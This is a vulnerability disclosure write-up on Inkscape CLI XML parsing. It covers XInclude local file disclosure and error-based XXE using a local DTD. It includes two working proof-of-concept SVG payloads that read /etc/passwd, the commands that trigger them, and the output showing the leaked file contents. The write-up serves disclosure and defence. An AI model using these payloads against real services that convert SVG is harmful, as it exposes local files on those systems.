# XML Parsing Issues in Inkscape CLI

We recently came across an application using the [Inkscape CLI](https://wiki.inkscape.org/wiki/Using_the_Command_Line) to convert generated SVG input text to a PDF file. We had a limited injection on the SVG input and chose to perform a rapid review of the latest Inkscape version (v1.2-alpha1 at time of writing), where we discovered two separate issues related to XML parsing, allowing for arbitrary file disclosure.

This was reported to the developers of inkscape, in which they insisted this was by design, and calling applications need to ensure they sanitise input correctly to avoid issues.

This short write-up provides two ways to leverage SVG injection to achieve LFI in Inkscape CLI.

## Preface

Inkscape is an opensource and cross-platform vector graphics editor, offering a broad set of features. Inkscape uses the standardized SVG file format as its main format, which is supported by many other applications including web browsers. It can import and export various file formats, including SVG, AI, EPS, PDF, PS and PNG. It has a comprehensive feature set, a simple interface, multi-lingual support and is designed to be extensible; users can customize Inkscape's functionality with add-ons. 

## XInclude Local File Disclosure 

### Description

Inkscape added support for XML XInclude in Merge Request https://gitlab.com/inkscape/inkscape/-/merge_requests/1150[1150] in late 2019, that introduced a local file disclosure vulnerability.

If an attacker can inject a `xi:include` XML tag into the input SVG, it will include the contents of the referenced local file in the output data of a generated PDF.

### Impact 

The Inkscape CLI binary exposes the contents of local files on the system, which is included in the output file.

### Proof-of-Concept 

```
<svg width="1000" height="20px" xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="5" x="0" y="10">
		<xi:include parse="text" href="file:///etc/passwd"/>
	</text>
</svg>
```

Current Version (Inkscape 1.2-alpha1)
`inkscape test.svg --export-type=pdf --export-filename=output.pdf`

Utilities such as `pdftotext` can be used to fetch the PDF stream data:

```
$ pdftotext test.pdf out.txt ; head -2 out.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## Error-based XXE (Local DTD)

### Description 

There exists an error-based XML XXE vulnerability, that allows arbitrary file contents to be outputted to stderr. 

Successful exploitation requires the ability to control the start of the SVG input text and knowledge of a vulnerable local DTD file on the underlying system (see [reference](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)).

### Impact

The Inkscape CLI binary exposes the contents of local files, however is limited to stderr output.

### Proof-of-Concept 

```
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">test</text>
</svg>
```

Older Versions
`inkscape test.svg --export-pdf=output.pdf`

Current Version
`inkscape test.svg --export-type=pdf --export-filename=output.pdf`

```
file:///usr/share/xml/fontconfig/fonts.dtd:118: parser error : ContentDecl : Name or '(' expected
<!ELEMENT patelt (%constant;)">

Entity: line 2:
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        ^
file:///usr/share/xml/fontconfig/fonts.dtd:118: parser error : expected '>'
<!ELEMENT patelt (%constant;)">

Entity: line 2:
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        ^
Entity: line 4: parser error : Invalid URI: file:///nonexistant/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

## Discovered
* March 2022, Victor, elttam

## References
* https://gitlab.com/inkscape/inkscape/-/merge_requests/1150
* https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/
* https://www.xpdfreader.com/pdftotext-man.html
